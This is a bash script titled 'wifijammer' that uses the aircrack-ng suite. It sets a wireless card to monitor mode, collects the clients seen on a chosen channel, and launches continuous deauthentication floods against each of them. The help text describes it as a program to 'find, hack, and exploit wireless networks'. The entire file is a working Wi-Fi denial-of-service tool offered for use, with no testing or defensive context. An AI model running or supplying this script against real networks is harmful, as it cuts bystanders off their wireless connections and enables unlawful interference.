#!/bin/bash


# Patched and extended by AV

VERSION=0.3
ESSID=""
while getopts "w:c:e:hv" OPTION; do
	case "$OPTION" in
		# This argument sets the amount of time to wait collecting airodump data
		w)
			WIFIVAR=$OPTARG
			;;
		c)
			NUMBER=$OPTARG
			;;
		e)
			ESSID=$OPTARG
			;;
		h)
			echo -e "wifijammer, version $VERSION
Usage: $0 [-s] -w [wifi card] -c [channel]

This is a bash based wifi jammer. It uses your wifi card to continuously send de-authenticate packets to every client on a specified channel... at lest thats what its suppose to do. This program needs the Aircrack-ng suit to function and a wifi card that works with aircrack.

Options:
	Required:
	-w	wlan interface to use
	-c	channel to scan	

	Optional:
	-e	filter on a specifc ESSID
	-h	display help message
	-v	display version

Example: $0 -w wlan0 -c 2

Report bugs to http://code.google.com/p/wifijammer/ -> issues section
Written by esmith2000@gmail.com"
			exit 1
			;;
		v)
			echo "$0, version $VERSION"
			;;
	esac
done

if [[ $# -lt 1 ]]; then
	echo -e "wifijammer, $VERSION
Usage: $0 [-s] -w [wifi card] -c [channel]
Program to find, hack, and exploit wireless networks.
Options:
	Required:
	-w	wlan interface to use
	-c	channel to scan	

	Optional:
	-e	filter on a specific ESSID
	-h	display help message
	-v	display version

Example: $0 -w wlan0 -c 2

Report bugs to http://code.google.com/p/wifijammer/ -> issues section
Written by esmith2000@gmail.com and developers at http://code.google.com/p/wifijammer/"
			exit 1
fi

if [[ $WIFIVAR == "" ]]; then
	echo "You must specify the -w option!"
	exit 1
fi

if [[ $NUMBER == "" ]]; then
	echo "You must specify a channel with the -c option!"
	exit 1
fi

if [ x"`which id 2> /dev/null`" != "x" ]; then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]; then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]; then
	#Guess not
	echo Run it as root ; exit ;
fi

# Changes working directory to the same as this file
DIR="$( cd "$( dirname "$0" )" && pwd )"
cd $DIR

#Checks if user specified a WIFI card
if [ x"$WIFIVAR" = x"" ]; then
	echo "No wifi card specified, scanning for available cards (doesnt always work)"
	USWC="no"
else
	echo "Using user specified wifi card ""$WIFIVAR"
	USWC="yes"
fi

if [ x"$USWC" = x"no" ]; then
	# Uses Airmon-ng to scan for available wifi cards.
	airmon-ng|cut -b 1,2,3,4,5,6,7 > clist01
	count=0
	if [ -e "clist" ]; then
		rm clist
	fi

	cat clist01 |while read LINE ; do
		if [ $count -gt 3 ];then 
			echo "$LINE" | cut -b 1-7 | tr -d [:space:] >>clist
			count=$((count+1))
		else
			count=$((count+1))
		fi
	done
	rm clist01
	
	WIFI=`cat clist`
	echo "Using first available Wifi card: `airmon-ng|grep "$WIFI"`"
	echo "If you would like to specify your own card please do so at the command line"
	echo "etc: sudo ./wifijammer_0.1 eth0"
	rm clist
else
	WIFI="$WIFIVAR"
fi

#Check for a wifi card
if [ x"$WIFI" = x"" ]; then
	#Guess no wifi card was detected
	echo "No wifi card detected. Quitting" 
	exit
fi

#Start the wireless interface in monitor mode
if [ x"$airmoncard" != x"1" ]; then
	airmon-ng start $WIFI >tempairmonoutput
	airmoncard="1"
fi

#Looks for wifi card thats been set in Monitor mode
if [ x"$testcommandvar02" = x"" ]; then
	WIFI02=`cat tempairmonoutput | grep "monitor mode enabled on" | cut -b 30-40 | tr -d [:space:] |tr -d ")"`
	if [ x$WIFI02 = x ]; then
		WIFI02=`cat tempairmonoutput | grep "monitor mode enabled" | cut -b 1-5 | tr -d [:space:]`
	fi
	WIFI="$WIFI02"
	rm tempairmonoutput
fi
	
echo "Wirelass card used: $WIFI"

# Launches airodump-ng on specified channel to start gathering a client list
rm *.csv 2>/dev/null

if [ x"$ESSID" != x"" ]; then
	echo "Scanning specified channel deauthing only stations associated to $ESSID"
	airodump-ng -c $NUMBER -w airodumpoutput --essid "$ESSID" $WIFI &> /dev/null &
else
	echo "Scanning specified channel"
	airodump-ng -c $NUMBER -w airodumpoutput $WIFI &> /dev/null &
fi

sleep 4

# Removes temp files that are no longer needed
rm *.cap 2>/dev/null
rm *.kismet.csv 2>/dev/null
rm *.netxml 2>/dev/null

# Makes a folder that will be needed later
mkdir stationlist 2>/dev/null
rm stationlist/*.txt

# Start a loop so new clients can be added to the jamming list
start="no"
while [ x1 ]; do
	sleep 5s
	# Takes appart the list of clients and reorganizes it in to something useful
	cat airodumpoutput*.csv|while read LINE01 ; do
		echo "$LINE01" > tempLINE01
		STATION=`echo $LINE01|cut -f 1 -d ,|tr -d [:space:]`
		BSSID=`echo $LINE01|cut -f 6 -d ,|tr -d [:space:]`
		rm tempLINE01
		# Ignores any blank 
		if echo -n $BSSID | grep -q -F "notassociated"; then
			continue
		fi
		if [ x"$STATION" != x"" ];then
			if [ x"$start" = x"yes" ];then
				if [ -e stationlist/"$BSSID-$STATION".txt ];then
					echo "" &>/dev/null
				else
					# Lauches new window with de-authenticate thingy doing it's thing
					echo "Jamming $STATION associated to $BSSID"
					echo "aireplay-ng --deauth 0 -a $BSSID -c $STATION $WIFI &> /dev/null &"
					aireplay-ng --deauth 0 -a $BSSID -c $STATION $WIFI &> /dev/null &
					echo "Jamming under pid $!" > stationlist/$BSSID-$STATION.txt
				fi
			fi
			if [ x"$STATION" = x"StationMAC" ];then
				start="yes"
			fi
		fi
	done
done

